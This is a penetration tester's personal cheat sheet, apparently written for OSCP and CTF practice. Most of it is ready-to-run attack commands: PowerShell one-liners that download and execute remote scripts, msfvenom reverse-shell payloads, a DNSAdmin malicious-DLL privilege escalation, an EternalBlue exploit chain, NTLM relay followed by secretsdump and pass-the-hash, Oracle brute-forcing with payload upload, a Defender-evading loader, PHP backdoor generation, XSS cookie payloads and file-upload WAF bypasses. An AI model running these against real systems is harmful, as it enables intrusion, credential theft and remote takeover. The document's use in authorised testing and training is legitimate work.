# Disclaimer
The following notes are a mix of all the remarkable things I have seen and am seeing in my day-to-day life as a Pentester and also as a CTF/Boot2Root participant. 

These notes have been written mainly to have a collection of commands that have worked well and having it all collected has to serve as a "shortcut".

They have also been written as part of my preparation for OSCP.

By all of the above I mean that these Notes are not for malignant or malicious purposes, and cannot be used to carry out malicious/illegal actions.

**I will not be responsible** in any way for the use people may make of the concepts and commands explained in the following sections.


Table of Contents
=================

   * [Table of Contents](#table-of-contents)
   * [Reconnaissance &amp; Gathering](#reconnaissance--gathering)
      * [Mapping the Network](#mapping-the-network)
      * [NBTscan](#nbtscan)
      * [Nmap scan basics](#nmap-scan-basics)
      * [DNS subdomains reconnaissance](#dns-subdomains-reconnaissance)
      * [NFS enumeration](#nfs-enumeration)
      * [SMTP enumeration](#smtp-enumeration)
   * [PowerShell](#powershell)
      * [To load a PS module into the memory](#to-load-a-ps-module-into-the-memory)
      * [Changing <em>ExecutionPolicy</em> to Bypass](#changing-executionpolicy-to-bypass)
      * [Executing commands as another user](#executing-commands-as-another-user)
   * [PrivEsc on Windows](#privesc-on-windows)
      * [Bypassing Windows Defender](#bypassing-windows-defender)
      * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
      * [Using BloodHound](#using-bloodhound)
      * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
      * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
   * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
   * [Oracle Hacking](#oracle-hacking)
   * [Forensics](#forensics)
      * [Extracting credentials from memory dump](#extracting-credentials-from-memory-dump)
   * [WebApplication Hacking](#webapplication-hacking)
      * [Create a PHP Backdoor shell](#create-a-php-backdoor-shell)
      * [Demonstrating the possibility of steal cookies abusing of XSS vulnerability](#demonstrating-the-possibility-of-steal-cookies-abusing-of-xss-vulnerability)
      * [Check for broken links to hijack](#check-for-broken-links-to-hijack)
      * [Bypassing file upload WAF](#bypassing-file-upload-waf)
   * [Utils](#utils)
      * [Shell to TT](#shell-to-tt)
      * [Capture traffic](#capture-traffic)
      * [Detect incoming Ping](#detect-incoming-ping)
      * [Mount SMB shares](#mount-smb-shares)
      * [Mount VHDX virtual machines](#mount-vhdx-virtual-machines)
      * [Speeding up Nmap and ProxyChains](#speeding-up-nmap-and-proxychains)
      * [Scanning ports with NetCat](#scanning-ports-with-netcat)
      * [SSH cipher legacy](#ssh-cipher-kegacy)
   * [Miscellaneous](#miscellaneous)
      * [Terminal recording](#terminal-recording)
      * [Command output copy](#command-output-copy)
      * [Bash init commands](#bash-init-commands)
      * [Regex Utils](#regex-utils)
      * [Reverse a list in Bash](#reverse-a-list-in-bash)

# Reconnaissance & Gathering
## Mapping the Network
If we wanted to check for machines on the subnet with SMB signing not enabled, we can use RunFinger.py which is in the responder toolset.
```bash
responder-RunFinger -i [IP_ADDRESS]</MASK>
responder-RunFinger -i 10.0.2.0/24
```
## NBTscan
It will scan IP networks for NetBIOS accesible information.
```bash
nbtscan -v -s : 192.168.1.0/24
```
## Nmap scan basics
The well-known nmap program will scan for reachable host and its version, possible vulnerabilities...
```bash
nmap -p- -sV -sS -T4 -oA nmap-output [IP]</MASK>
```
Additionaly, you can run it with:
* -sC: This will try to run some default scripts over the services
* -sV: Get the service version

## DNS subdomains reconnaissance
Starting an external assessment to any client, the firest we used to do is to perform a gathering phase over the clients domains,
in order to get as much information as possible. We usually do focus on subdomains finding, so we want to find out all the servers/vhosts/websites belonging to the client.

The following are tools we have used and get some good results with:
* fierce --> [Github](https://github.com/mschwager/fierce)
* censys --> [Github](https://github.com/christophetd/censys-subdomain-finder)
* sublist3r --> [Github](https://github.com/aboul3la/Sublist3r)

The best tool we are used so far is sublist3r because it supports the search into the main searching cores of internet (Google, Bing, etc...)
Fierce is the most basic one, yet very good to perform fast reconnaissances.
Censys needs an API, easy to retrieve from its website.

## NFS enumeration
If port scan returns any port which may indicates a NFS mount point accessible, we could just do the below command in order to enumerate possible opened shares:
```bash
showmount -e [RHOST]
```

If it returns any, we can mount it locally just doing:
```bash
sudo mount -t nfs [RHOST]:/[SHARE] /mnt/
```

## SMTP enumeration
It could be interesting to perform a BruteForce over the SMTP. It's recommended in cases when the nmap enumeration has not returned the data it normally returns.
```bash
smtp-user-enum -M VRFY -U /usr/share/wordlists/dirb/common.txt -t [RHOST]
```

# PowerShell
## To load a PS module into the memory
```powershell
powershell.exe -exec bypass -Command "IEX (New-Object Net.WebClient).DownloadString($URL);"
# Here call the modules you want to execute, depending on the usage of what you have downloaded
```

## Changing *ExecutionPolicy* to Bypass
The following command in PowerShell, if we have enough permissions, will change the executionPolicy so we should be able to execute, for instance, scripts.

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

## Executing commands as another user
Have we obtained a shell from your objective and got any credentials we can use to impersonate any user, the following commands will give us a shell with the other user permissions:
```powershell
$password = ConvertTo-SecureString '__PasswordObtained__' -Asplain -Force
$credential = New-Object System.Management.Automation.PSCredential('__Domain__\__User__', $password)
Invoke-Command -Computer __Hostname__ -Credential $credential -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://__LHOST__/rev.ps1') }
```

# PrivEsc on Windows
## Bypassing Windows Defender
There're a [usefull scripts](https://astr0baby.wordpress.com/2019/01/26/custom-meterpreter-loader-in-2019/), from **Astr0baby's blog**, just copy-paste them.

**NOTE:** There're some replaces needed in the listener.sh script:

1. *Line 12:* remove the ./ from the call to msfconsole
2. *Line 16:* add -job after the run sentence

```bash
./msf-loader.sh
# introduce LHOST
# introduce LPORT
# domain to impersonate?
# The process should have created a 'payload.exe' and also 'payload-signed.exe'
./listener.sh
# Define the LHOST
# Define the LPORT
# Now the payload shall be ran into the target
```

## Sharing files with Windows machine
**NOTE:** This technique is usefull also to share files with any Windows VM *(or the parent host)*
```bash
impacket-smbserver share [path] -smb2support
```

Using this simple technique we will be able to upload as much privesc tools as we want, in a easiest way.

## Using BloodHound
BloodHound is a very useful technique of Active Directory gathering. It would be a must in every Privilege Escalation we want to perform.
We have to download SharpHound.ps1 from its last repository *(it has been changed any times, so we have to check...)*
```powershell
# with our local machine sharing using any technique like python3 -m http.server or impacket-smbserver...
Set-Execution Bypass -Scope Process
Import-Module [PATH_TO_SHARE]\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -JSONFolder [PATH_TO_RESULTS]
```

## From DNSAdmin to Administrator
Having this localgroup rights, it's possible to escalate to Administrator and achieve SYSTEM rights. As explained in [this link](https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2), the steps to perform the privilege escalation are:
```bash
# Malicious DLL creation
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[LHOST] LPORT=8080 -f dll > privesc.dll
# Setting up SMB server to serve the DLL
impacket-smbserver evil .
```
```powershell
// Obtaining FQDN from host:
[System.Net.Dns]::GetHostByName($env:computerName)
dnscmd [FQDN] /config /serverlevelplugindll //[LHOST]/evil/privesc.dll
cmd.exe /c "sc.exe stop DNS"
cmd.exe /c "sc.exe start DNS"
```

## From Exchange Windows Permissions group to Administrators
Having this localgroup rights, it's possible to escalate to Administrators and achieve SYSTEM rights. This could be gained using, for instance, impacket libraries. These steps have to be followed:
```bash
./ntlmrelayx.py -t ldap://[RHOSTS] --escalate-user [USER_WE_HAVE]
: ' Results should looks like:
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
' 
```

Now I need to authorize the connection, I need to browse the http://localhost/privexchange and login as the user, which we want to enhance, to authenticate the action. As soon as I authenticate, I can see the user got permission.
```bash
: ' The terminal would look like:
[*] Servers started, waiting for connections
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /privexchange
[*] HTTPD: Client requested path: /privexchange
[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from 127.0.0.1, attacking target ldap://10.10.10.161
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] HTTPD: Client requested path: /favicon.ico
[*] User privileges found: Create user
[*] Dumping domain info for first time
[*] Authenticating against ldap://10.10.10.161 as \[USER] SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Domain info dumped into lootdir!
[*] User privileges found: Create user
'
```

Secretsdump can be utilized to get hashes of more privileged users:
```bash
secretsdump [DOMAIN]/[USER]:[PASSWORD]@10.10.10.161
# And if we have luck, we can use the hash with *psexec*, or try to crack it.
./psexec.py -hashes :[HASH] [DOMAIN]/administrator@[RHOST] powershell.exe
```

# Eternalblue Vulnerabilities exploitation

For those who want to exploit this very common vulnerabilities, present in a lot of boot2root machines, but taking the handicap that no Metasploit is going to be utilized, there are different techiniques/exploits that you can use. 

Metasploit must be avoided for example if you are being training yourself to get OSCP certification you surely know that MSF is banned... Or just simply to be more independent of this kind of tools.

To detect if we are in front of the vulnerability, the nmap can do the job:
```bash
sudo nmap -p445 --script smb-vuln-ms17-010 <target>
```

There is also a [usefull script](https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py) which will check for the vulnerability into the [IP] server we indicate.

**Once we know the system is vulnerable** we can use [this repositoy](https://github.com/helviojunior/MS17-010). We should also create a valid payload, I think nowadays OSCP doesn't penalize the use of *msfvenom* as long as we don't use it to create a 'meterpreter' payload. The following command can be executed:
```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o reverse-shell.exe
 ```
 
 We can put a listening socket like this:
 ```bash
 sudo nc -lvp 443
 ```
 
 And finally, we launch the attack:
 ```bash
 python send_and_execute.py $ip reverse-shell.exe
 ```

# Oracle Hacking

First of all we need to know SID, which is basically the name of the databases in the Oracle structure.
If the listener is not password protected, we should get it just running this simple command:
```bash
nscmd10g  status -h [IP]
```
We could get errors in this execution, we can check these errors in [this site](https://docs.oracle.com/database/121/ERRMG/TNS-00000.htm#ERRMG-GUID-D723D931-ECBA-4FA4-BF1B-1F4FE2EEBAD7").

If the error points to a incompatibility between your machine and server, you can add one flag to the previous command like this:

```bash
tnscmd10g status --10G -h [IP]
```

If the error persists, the listener could be password protected, with hydra we can get the password:

```bash
hydra -P [WORDLIST] -t 32 -s 1521 [IP] oracle-listener
```

It very recommendable to bruteforce the SID as well:

```bash
# The following application is native in Kali.
sidguess -i [IP] -d /usr/share/wordlists/metasploit/sid.txt 
# Instead, the following one has to be download from its repository
./odat-libc2.12-x86_64 sidguesser -s [IP]
```

Both options are awesome to find valids SIDs, but the 'odat' software is the best in Oracle-hacking related activities.

Once we've found the SIDs, we can still use 'odat' to perform further actions:
```bash
# We can bruteforce users like this:
./odat-libc2.12-x86_64 passwordguesser -s [IP] -d [SID] --accounts-files [USERS-FILE] [PASS-FILE]
```

If we find valid credentials, we can check vulnerabilities performing:
```bash
./odat-libc2.12-x86_64 all -s [IP] -d [SID] -U [USER] -P [PASS]
```

Trying to upload & execute payload:
```bash
./odat-libc2.12-x86_64 utlfile -s [IP] -U [USER] -P [PASS] --sysdba --putFile C:/ mal.exe /tmp/mal.exe -d [SID]
./odat-libc2.12-x86_64 externaltable -s [IP] -U [USER] -P [PASS] -d [SID] --sysdba --exec C:/ mal.exe
```

# Forensics
## Extracting credentials from memory dump
If we are lucky maybe we found memory dump file, for ethical hacking matters the most valuable information we can retrieve from this type of files are the hashes/plain text passwords, using volatility is just simple as:
```bash
# First let's get some information about the system:
volatility -f [DUMP-FILE] imageinfo
# Now we can try to dump the credentials in plain text, lsadump plugin will do the job
volatility -f [DUMP-FILE] --profile=[PROFILE-SUGGESTED] lsadump
# It's possible that we don't find any, overall in latest Windows SO versions, we can run a third execution:
volatility -f [DUMP-FILE --profile [PROFILE-SUGGESTED hivelist
# The result of this last command should be some system paths, we have to look for SYSTEM and SAM files:
volatility -f [DUMP-FILE] --profile [SUGGESTED-FILE] hashdump -y [SYSTEM-VIRTUAL-ADDRESS] -s [SAM-VIRTUAL-ADDRESS]
```

# WebApplication Hacking
## Create a PHP Backdoor shell
The software named **weevely** will help on this matter. It's a software that crates the php file to upload to the exploited
server.

```bash
# Generate new agent
weevely generate <password> <path>
# Run terminal or command on the target
weevely <URL> <password> [cmd]
# Recover an existing session
weevely session <path> [cmd]
```

## Demonstrating the possibility of steal cookies abusing of XSS vulnerability
```js
alert(self['alert'](self['document']['cookie']))
alert(document.cookie)
```

[Interesting link - talks about WAF bypass](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)

## Check for broken links to hijack
**broken-link-checker** will crawl a target and look for broken links. Whenever I use this tool I like to run:
```bash
blc -rof --filter-level 3 https://example.com/
```
Adapting it to something like this in order to prevent false positives:
```bash
blc -rfoi --exclude linkedin.com --exclude youtube.com --filter-level 3 https://example.com/
```

## Bypassing file upload WAF
The following are some tips to get the WAF bypassed, and be able to exploit some vulnerability to upload, for example, a webshell.
* Change *Content-Type*
* Try to change the file extension to some executable-extensions like *.php5, .php3, .shtml, .asa*
* Change extension letters to capital, for example *.pHp5, .Php3, .aSp, ...*
* Put spaces and/or dots at the end of the filename like *file.asp  . .    .... .*
* Use a semicolon after the forbidden extension and before the permitted extension. Example: *file.asp;.jpg* (Only IIS 6 or prior)
* Upload a file with multiple extensions like *file.php.jpg*
* Use a NULL-characters: *file.asp%00.php"*
* Create a file with a forbidden extension: *file.asp:.jpg* or *file.asp::$data*
* **Combination of the above**

# Utils
## Shell to TT
```bash
python -c "import pty;pty.spawn('/bin/bash')"
Ctrl + z
stty raw -echo
fg
```

## Capture traffic
It's very recommendable to record all the traffic, while we're performing an internal InfoSec assesment to any client.
If it's expected to generate tons of traffic, for example, if we are testing a large infrastructure organisation, I recommend to capture
only the outgoing traffic, it is possible with the following command:

```bash
sudo tcpdump -v -ni [INTERFACE] -w [FILE-OUT] -C 100 src host [OUR_IP]
```

However, if we want to capture both outbound and inbound traffic, use the following command:

```bash
sudo tcpdump -v -ni [INTERFACE] -w [FILE-OUT] -C 100
```

The commands above are going to generate files with size of 100 Mb, so it will be feasible to analyze, if necessary.

## Detect incoming Ping
Very useful when we are trying to get reverse connection, for example from a RCE vulnerability. The following command will dump all the incoming
ping to our network interface.

```bash
sudo tcpdump ip proto \\icmp
```

## Mount SMB shares
Great option if we're looking for some more control among the data located in those shares exposed. If we mount locally we will be able to perform actions like "grep -ri 'any-keyword' /mnt/juicy-share", por example..

We can mount SMB with the following command:
```bash
sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME]
```

Of course it won't be that easy the most of the times, if we want to give credentials and domain we can use this command:
```bash
sudo mount -t cifs //[IP]/[SHARE_NAME] /mnt/[SHARE_NAME] -o "username=[USER],password=[PASS],domain=[DOMAIN]" /mnt/[SHARE_NAME]
```

## Mount VHDX virtual machines
If we are given with any virtual machine export, we can mount its content with the following command line:

```bash
sudo guestmount --add /media/audit2/Disco_ext1/LadyBird/ladybird.vhdx --inspector --ro /mnt/LadyBird/
```

## Speeding up Nmap + ProxyChains
If we are pivoting and using a dinamically redirection trough SSH, we should use proxychains to carry out nmap discovery. A good execution which will highly speed up the task is the following:

```bash
seq 1 65535 | xargs -P 50 -I{} proxychains nmap -p{} -Pn --open -n -T4 --min-parallelism 100 --min-rate 1 --append-output -oG test 10.1.1.1 | grep open
```
## Scanning ports with NetCat
In case we don't have nmap available, there is the following simple yet functional for loop:

```bash
for i in {1..65535}; do timeout 0.01 nc -z -nv 10.1.1.236 $i; done
```

## SSH cipher legacy
If you get the following error when you attempted to connect for SSH:

***"no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1"***

You can do the following workaround:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@hostname
```

# Miscellaneous
## Terminal recording

We can add the following line to our *~/.bashrc* file in order to record each terminal we open.

```bash
test "$(ps -ocommand= -p $PPID | awk '{print $1}')" == 'script' || (script -f $HOME/.log/$(date +"%d-%b-%y_%H-%M-%S")_shell.log)
```

## Command output copy

It could be necessary to copy the command output directly to the **clipboard**, the following command make it possible:

```bash
[COMMAND] | xclip -selection clipboard
```
## Bash init commands

It would be very interesting to add this oneliner command to the "Initial command" from the selected terminal-type:
```bash
tput bold; tput setaf 2; echo -n "wlan0: ";ifconfig wlan0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; if ifconfig tun0 2> /dev/null 1>&2; then echo -n "tun0: ";ifconfig tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'; fi; tput init; bash 
```
This command above will place, every time we open a new terminal, the following usefull data:

wlan0: [IP]

tun0: [IP]

I have utilized this information because these are the interfaces I normally have UP. Of course the command is highly escalable according the each one needs...

## Regex Utils

I started to learn in deep how to use regex. This search "engine" is one of the most used and usefull in my opinion. It will be pasted some interesting patterns.

**Matching IPs:**

```bash
([\d]{1,3}\.){3}[\d]{1,3}
```

**Matching IPs and port:**

```bash
(([\d]{1,3}\.){3}[\d]{1,3})\:[\d]{1,5}
```
## Reverse a list in Bash

```bash
cat [FILE] | awk '{ for (i=NF; i>1; i--) printf("%s ",$i); print $1; }'
```
